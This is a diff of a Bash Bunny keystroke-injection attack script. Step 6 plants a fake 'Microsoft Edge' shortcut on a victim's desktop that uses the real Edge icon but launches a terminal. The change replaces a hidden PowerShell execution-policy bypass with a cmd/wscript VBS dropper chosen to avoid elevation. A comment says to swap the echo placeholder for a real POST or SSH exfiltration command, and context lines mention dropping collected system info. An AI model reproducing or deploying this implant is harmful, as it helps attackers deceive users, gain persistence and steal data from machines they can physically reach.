@@ -114,19 +114,14 @@ log INFO "STEP 5 OK: Drop command sent — Bash Bunny reads %%TEMP%%\.sysinfo af
 #####################Fake Microsoft Edge Shortcut###########################
 # Creates a shortcut on H:\Desktop named "Microsoft Edge" that actually opens
 # a terminal. The icon is pulled from the real msedge.exe so it looks legit.
-# Replace the echo payload with a real POST/SSH command when ready.
+# Uses cmd + wscript only — no PowerShell, no elevation, no execution policy bypass.
+# Replace the echo line with a real POST/SSH command when ready.
 
-log INFO "STEP 6: Planting fake Microsoft Edge shortcut on H:\\Desktop"
+log INFO "STEP 6: Planting fake Microsoft Edge shortcut on H:\\Desktop (no elevation)"
 Q DELAY 1500
 Q GUI r
 Q DELAY 600
-Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass
-Q ENTER
-Q DELAY 1200
-Q STRING "\$ws=New-Object -ComObject WScript.Shell; \$s=\$ws.CreateShortcut('H:\\Desktop\\Microsoft Edge.lnk'); \$s.TargetPath='cmd.exe'; \$s.Arguments='/c start powershell -NoExit -Command echo This could be a POST or SSH command'; \$s.IconLocation='C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,0'; \$s.Description='Microsoft Edge'; \$s.Save()"
-Q ENTER
-Q DELAY 400
-Q STRING exit
+Q STRING cmd /c "echo Set ws=CreateObject("""WScript.Shell"""):Set s=ws.CreateShortcut("""H:\Desktop\Microsoft Edge.lnk"""):s.TargetPath="""cmd.exe""":s.Arguments="""/c start powershell -NoExit -Command echo This could be a POST or SSH command""":s.IconLocation="""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,0""":s.Save > %TEMP%\mk.vbs && wscript //nologo %TEMP%\mk.vbs && del /f %TEMP%\mk.vbs"
 Q ENTER
 log INFO "STEP 6 OK: Shortcut planted — clicking it opens PowerShell payload"
 
